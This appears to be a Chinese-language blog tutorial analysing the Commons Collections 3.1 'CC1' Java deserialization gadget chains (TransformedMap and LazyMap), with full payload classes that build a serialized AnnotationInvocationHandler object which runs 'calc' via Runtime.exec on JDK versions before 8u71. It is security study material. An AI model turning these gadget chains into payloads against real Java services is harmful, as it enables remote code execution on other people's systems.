# 环境搭建

限制：只能用于JDK8u71

我是直接在[ysoserial](https://github.com/frohoff/ysoserial)下载下来，然后利用`maven`下载各种包，然后创建自己的文件夹开始调试

实际上只需要创建一个maven的项目，然后安装包

maven配置：

```java
<dependencies>
    <dependency>
        <groupId>commons-collections</groupId>
        <artifactId>commons-collections</artifactId>
        <version>3.1</version>
    </dependency>
</dependencies>
```
# TransformedMap

## Transformer接口

定义了一个`transformer`接口，主要用于转换对象

```java
package org.apache.commons.collections;

public interface Transformer {
    Object transform(Object var1);
}
```

###  ConstantTransformer类

实现了`Transformer`接口，但是是输入一个对象，输出一个固定的对象

```java
 public Object transform(Object input) {
        return this.iConstant;
    }
```

传入任何对象都将返回设定好的Constant对象，设定的Constant对象在构造器中传入

```java
package payload.cc1;

import org.apache.commons.collections.functors.ConstantTransformer;
public class ConstantTransformerTest {
    public static void main(String[] args) {
        Object obj="123456";
        ConstantTransformer constantTransformer =new ConstantTransformer("z3eyond");
        System.out.println(constantTransformer.transform(obj));
    }
}
```

### InvokerTransformer类

实现了Transformer接口，并且还支持序列化。

重写的transform方法利用反射去调用一个类方法。类构造时可以传入利用的方法名，参数类型和参数，最后返回方法执行后的返回值。

```java
 public Object transform(Object input) {
        if (input == null) {
            return null;
        } else {
            try {
                Class cls = input.getClass();
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                return method.invoke(input, this.iArgs);
            } catch (NoSuchMethodException var5) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
            } catch (IllegalAccessException var6) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
            } catch (InvocationTargetException var7) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var7);
            }
        }
    }
```

测试：

```java
package payload.cc1;

import org.apache.commons.collections.functors.InvokerTransformer;
public class InvokerTransformerTest {
    public static void main(String[] args) {
        Object o=Runtime.getRuntime();
        InvokerTransformer it =new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
        it.transform(o);
    }
}
```

###  ChainedTransformer类

实现了Transformer接口，也支持序列化

```java
public Object transform(Object object) {
        for(int i = 0; i < this.iTransformers.length; ++i) {
            object = this.iTransformers[i].transform(object);
        }

        return object;
    }
```

定义它的时候传入了一个Transformer数组，该方法就会依次调用每个Transformer的transform方法，并且调用方法传入的对象是上一个Transformer的transform方法的返回值。



在该类，我们可以依次通过反射调用多个类方法，这个位置也就是实现命令执行的地方。

实现命令执行：

```java
package payload.cc1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class payload1 {
    public static void main(String[] args) {
        ConstantTransformer ct = new ConstantTransformer(Runtime.class);
        InvokerTransformer it1 = new InvokerTransformer(
            "getMethod",
            new Class[]{String.class, Class[].class},
            new Object[]{"getRuntime", new Class[0]}
        );
        InvokerTransformer it2 = new InvokerTransformer(
            "invoke",
            new Class[]{Object.class, Object[].class},
            new Object[]{null, new Object[0]}
        );
        InvokerTransformer it3 = new InvokerTransformer(
            "exec",
            new Class[]{String.class},
            new Object[]{"calc"}
        );
        Transformer[] transformers = new Transformer[]{ct, it1, it2, it3};
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        chainedTransformer.transform(null);
    }
}

```

命令执行的部分解决了，现在考虑是怎么去触发这个`chainedTransformer`的`thansform`方法

## TransformedMap类

类的构造是`protected`,不能实例化

```java
  protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        super(map);
        this.keyTransformer = keyTransformer;
        this.valueTransformer = valueTransformer;
    }
```

利用`decorate`方法，来进行实例化

```java
 public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        return new TransformedMap(map, keyTransformer, valueTransformer);
    }
```

实例化需要传入三个参数——被修饰的Map对象、对键与值操作的Transformer对象

`transformKey/transformValue/transformMap/checkSetValue`方法，可以触发回调函数transform



我们找到触发transform方法的入口了，也就是说我们要新建一个TransformedMap，然后设置keyTransformer/valueTransformer为上面为了RCE构造的ChainedTransformer，接着找这三个方法在哪触发

####  利用put和putall函数

对键值进行操作：如果设置了keyTransformer/valueTransformer，每次put前要将键值过一遍对应Transformer的transform方法

```java
public Object put(Object key, Object value) {
        key = this.transformKey(key);
        value = this.transformValue(value);
        return this.getMap().put(key, value);
    }

    public void putAll(Map mapToCopy) {
        mapToCopy = this.transformMap(mapToCopy);
        this.getMap().putAll(mapToCopy);
    }
```

####  利用父类setValue方法，调用checkSetValue

子类：

```java
protected Object checkSetValue(Object value) {
        return this.valueTransformer.transform(value);
    }
```

父类：

```java
 public Object setValue(Object value) {
            value = this.parent.checkSetValue(value);
            return super.entry.setValue(value);
        }
```

##  命令执行

### ChainedTransformer+put触发命令执行

```java
package payload.cc1;
import java.util.Map;
import java.util.HashMap;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class payload2 {
    public static void main(String[] args) {
        ConstantTransformer ct = new ConstantTransformer(Runtime.class);

        InvokerTransformer it1 = new InvokerTransformer(
            "getMethod",
            new Class[]{String.class, Class[].class},
            new Object[]{"getRuntime", new Class[0]}
        );
        InvokerTransformer it2 = new InvokerTransformer(
            "invoke",
            new Class[]{Object.class, Object[].class},
            new Object[]{null, new Object[0]}
        );
        InvokerTransformer it3 = new InvokerTransformer(
            "exec",
            new Class[]{String.class},
            new Object[]{"calc"}
        );
        Transformer[] transformers = new Transformer[]{ct, it1, it2, it3};
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        Map map=new HashMap();
        map.put("key","value");
        Map transformermap = TransformedMap.decorate(map,null,chainedTransformer);
        transformermap.put("1","1");
    }
}

```

这个map不能为空，否则会报错

初始化`super`父类

```java
public AbstractMapDecorator(Map map) {
        if (map == null) {
            throw new IllegalArgumentException("Map must not be null");
        } else {
            this.map = map;
        }
    }
```

### ChainedTransformer+entrySet+父类setValue触发命令执行

```java
package payload.cc1;
import java.util.Map;
import java.util.HashMap;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class payload3 {
    public static void main(String[] args) {
        ConstantTransformer ct = new ConstantTransformer(Runtime.class);
        InvokerTransformer it1 = new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]});
        InvokerTransformer it2 = new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]});
        InvokerTransformer it3 = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
        Transformer[] transformers = new Transformer[]{ct, it1, it2, it3};
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        Map map = new HashMap();
        map.put("key", "value");

        Map transformermap = TransformedMap.decorate(map, null, chainedTransformer);
        for (Object obj : transformermap.entrySet()){
            Map.Entry entry = (Map.Entry) obj;
            entry.setValue("test");
        }
    }
}

```

获取`transformermap`的`set`集合，然后调用父类的`setValue`方法，触发`checkSetValue`方法

## AnnotationInvocationHandler类

触发transform的问题也解决了，那么就差序列化操作了，如何与`TransformedMap`相结合并且调用`readObject`？

有一类AnnotationInvocationHandler在sun.reflect.annotation，支持[反序列化](https://so.csdn.net/so/search?q=反序列化&spm=1001.2101.3001.7020)，可以看到它的构造函数正好可以传入一个Map对象，也就是可以传入`TransformedMap`

```java
 AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) {
        Class[] var3 = var1.getInterfaces();
        if (var1.isAnnotation() && var3.length == 1 && var3[0] == Annotation.class) {
            this.type = var1;
            this.memberValues = var2;
        } else {
            throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
        }
    }
```

只能反射进行实例化，同时实例化的时候是传入一个注解类和map对象

重写了`readObject`函数，且调用了`setvalue`函数

```java
private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        var1.defaultReadObject();
        AnnotationType var2 = null;

        try {
            //对传入的注解类进行实例化
            var2 = AnnotationType.getInstance(this.type);
        } catch (IllegalArgumentException var9) {
            throw new InvalidObjectException("Non-annotation type in annotation serial stream");
        }
		//获取注解对象的成员类型，注解方法名
        Map var3 = var2.memberTypes();
    	//获取传入的map对象的迭代器
        Iterator var4 = this.memberValues.entrySet().iterator();
		//hashNext判断是否有下一个元素
        while(var4.hasNext()) {
            //获取Entry对象的下一个键值对
            Entry var5 = (Entry)var4.next();
            //获取key
            String var6 = (String)var5.getKey();
            //如果var7不为null，那么就需要满足注解map中存在传入的map对象中key
            Class var7 = (Class)var3.get(var6);
            if (var7 != null) {
                Object var8 = var5.getValue();
                if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
                }
            }
        }

    }
```

##  pop链

```java
ObjectInputStream.readObject();
AnnotationInvocationHandler.readObject();
TransformedMap.entrySet().iterator().next().setValue();
TransformedMap.checkSetValue();
TransformedMap.transform();
ChainedTransformer.transform();
	ConstantTransformer.transform();
	InvokerTransformer.transform();
		Method.invoke();
		Class.getMethod();
	InvokerTransformer.transform();
		Method.invoke();
		Runtime.getRuntime();
	InvokerTransformer.transform();
		Method.invoke(;
		Runtime.exec();
```

##  payload

```java
package cc1;

import java.io.*;
import java.util.Map;
import java.util.HashMap;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class payload4 {
    public static void main(String[] args) throws Exception{
        ConstantTransformer ct = new ConstantTransformer(Runtime.class);
        InvokerTransformer it1 = new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]});
        InvokerTransformer it2 = new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]});
        InvokerTransformer it3 = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
        Transformer[] transformers = new Transformer[]{ct, it1, it2, it3};
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        Map map = new HashMap();
        //
        map.put("value", "value");

        Map transformermap = TransformedMap.decorate(map, null, chainedTransformer);
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Target.class, transformermap);

        File f = File.createTempFile("temp", "out");

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(f));
        oos.writeObject(obj);
        oos.close();

        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(f));
        Object o = ois.readObject();
        System.out.println(o);
        ois.close();

        f.deleteOnExit();
    }
}


```

## JDK的限制

这条`TransformedMap`链只能用于JDK8u71之前，原因就是从8u71开始，`AnnotationInvocationHandler`的`readObject()`方法发生了改变：

```java
    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        GetField var2 = var1.readFields();
        Class var3 = (Class)var2.get("type", (Object)null);
        Map var4 = (Map)var2.get("memberValues", (Object)null);
        AnnotationType var5 = null;

        try {
            var5 = AnnotationType.getInstance(var3);
        } catch (IllegalArgumentException var13) {
            throw new InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map var6 = var5.memberTypes();
        LinkedHashMap var7 = new LinkedHashMap();

        String var10;
        Object var11;
        for(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) {
            Entry var9 = (Entry)var8.next();
            var10 = (String)var9.getKey();
            var11 = null;
            Class var12 = (Class)var6.get(var10);
            if (var12 != null) {
                var11 = var9.getValue();
                if (!var12.isInstance(var11) && !(var11 instanceof ExceptionProxy)) {
                    var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass() + "[" + var11 + "]")).setMember((Method)var5.members().get(var10));
                }
            }
        }

        AnnotationInvocationHandler.UnsafeAccessor.setType(this, var3);
        AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(this, var7);
    }

```

没有`setValue`，触发不了

#  LazyMap

##  环境

```xml
<dependencies>

    <dependency>
        <groupId>commons-collections</groupId>
        <artifactId>commons-collections</artifactId>
        <version>3.1</version>
    </dependency>

</dependencies>

```

##  分析

`TransformedMap`是通过`checkSetValue`来触发`transform`方法

分析`LazyMap`类，发现有一个get方法调用了`transform`方法，该方法访问权限为public，可以在类外直接使用

```java
   public Object get(Object key) {
        if (!super.map.containsKey(key)) {
            Object value = this.factory.transform(key);
            super.map.put(key, value);
            return value;
        } else {
            return super.map.get(key);
        }
    }
```

get方法同时还要求传入一个Object 参数，get方法内部在调用transform方法之前会先判断一下key，如果当前map中不存在key的话，则通过factory来创建一个value,然后`put`方法

`factory`是`LazyMap`类的成员属性，其数据类型也是`Transformer`

`LazyMap`是`protected`修饰的，不能直接实例，看到`decorate`函数

```java
	public static Map decorate(Map map, Transformer factory) {
        return new LazyMap(map, factory);
    }
```

跟之前的一样，这样进行实例化。我们可以通过[反射](https://so.csdn.net/so/search?q=反射&spm=1001.2101.3001.7020)或者构造方法来控制factory参数。

怎么触发这个`get`方法？

`AnnotationInvocationHandler`类中找到了invoke方法和readObject方法中都调用了get方法，以下是invoke的部分关键代码：

```java
public Object invoke(Object var1, Method var2, Object[] var3) {
    Object var6 = this.memberValues.get(var4);
}
```

肯定选择`invoke`函数，这个`memberValues`的属性值，我们可以通过反射进行控制

如何去调用`AnnotationInvocationHandler`类中的invoke方法？

由于不是public访问权限，直接访问`AnnotationInvocationHandler`类是行不通的，通过分析`AnnotationInvocationHandler`类，发现这个类实现了`InvocationHandler`接口,可以利用`动态代理`的方法

我们的目标是调用LazyMap类的get方法，那么可以通过Proxy类的静态方法newProxyInstance来创建LazyMap类的动态代理对象，当LazyMap的实例调用方法时就会调用代理对象的invoke方法



```java
public static Object newProxyInstance(ClassLoader loader, Class<?>[] interfaces, InvocationHandler h);

参数loader表示目标对象所属类的加载器，因此这里要传入Map的类加载器

参数interfaces表示目标对象实现的接口（通过反射获取），也就是目标对象lazyMap实现的接口，这里还是传入Map对象

参数h表示代理类要完成的功能，注意参数h的类型时InvocationHandler，因此这里我们要传入AnnotationInvocationHandler对象

```

如何调用AnnotationInvocationHandler类中的invoke方法解决了，我们思考最后一个问题：AnnotationInvocationHandler对象如何在反序列化（调用readObject时）的过程中如何触发调用invoke方法？

看`readObject`方法:

我们将`proxyMap`这个代理对象传给`AnnotationInvocationHandler`中的`memberValues`

在`this.memberValues.entrySet().iterator()`调用方法时，就会触发代理类的`invoke`方法（代理对象调用任何方法InvocationHandler的invoke方法都会进行拦截，这就是动态代理技术）

```java
    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        Map var3 = var2.memberTypes();
        //获取LazyMap父类的entrySet
        Iterator var4 = this.memberValues.entrySet().iterator();
        while(var4.hasNext()) {
            //代理对象调用方法
            Entry var5 = (Entry)var4.next();
            String var6 = (String)var5.getKey();
            Class var7 = (Class)var3.get(var6);
            if (var7 != null) {
                Object var8 = var5.getValue();
                if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
                }
            }
        }
    }
```

## payload

```java
package payload.cc1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class payload5 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{
                String.class, Class[].class}, new Object[]{
                "getRuntime", new Class[0]}),
            new InvokerTransformer("invoke", new Class[]{
                Object.class, Object[].class}, new Object[]{
                null, new Object[0]}),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map map = new HashMap();
        Map lazyMap = LazyMap.decorate(map, transformerChain);
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        InvocationHandler annotationInvocationHandler = (InvocationHandler) construct.newInstance(Target.class, lazyMap);
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), lazyMap.getClass().getInterfaces(), annotationInvocationHandler);
        annotationInvocationHandler = (InvocationHandler) construct.newInstance(Target.class, proxyMap);
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(annotationInvocationHandler);
        oos.close();
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) ois.readObject();
    }
}

```

##  JDK限制

jdk8u71以前

#  参考文章

https://blog.csdn.net/qq_35733751/article/details/118462281

https://ho1aas.blog.csdn.net/article/details/121580216?spm=1001.2014.3001.5502